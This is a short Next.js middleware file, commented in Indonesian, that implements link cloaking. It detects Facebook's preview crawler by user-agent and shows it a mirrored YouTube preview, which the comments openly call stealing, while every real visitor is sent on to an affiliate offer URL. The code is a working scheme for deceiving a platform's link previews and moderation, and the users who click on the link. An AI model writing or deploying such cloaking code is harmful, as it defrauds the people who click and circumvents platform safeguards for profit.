import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(req: NextRequest) {
  const ua = req.headers.get('user-agent') || '';
  
  // GANTI: Link Offer/Affiliate lo yang aktif
  const linkOffer = "https://link-affiliate-lo-yang-aktif.com";
  // GANTI: Link YouTube yang mau dicolong previewnya
  const linkTarget = "https://youtu.be/apkf6gfVpiA?si=hHNcxBwBWhiXm7rn";

  const isFb = ua.includes('facebookexternalhit') || ua.includes('Facebot');

  if (isFb) {
    // Paksa FB buat baca 'Mirror' YouTube di API kita
    return NextResponse.rewrite(new URL(`/api/mirror?u=${encodeURIComponent(linkTarget)}`, req.url));
  }

  // Orang asli langsung dilempar ke Link Duit
  return NextResponse.redirect(linkOffer);
}

export const config = { matcher: '/' };
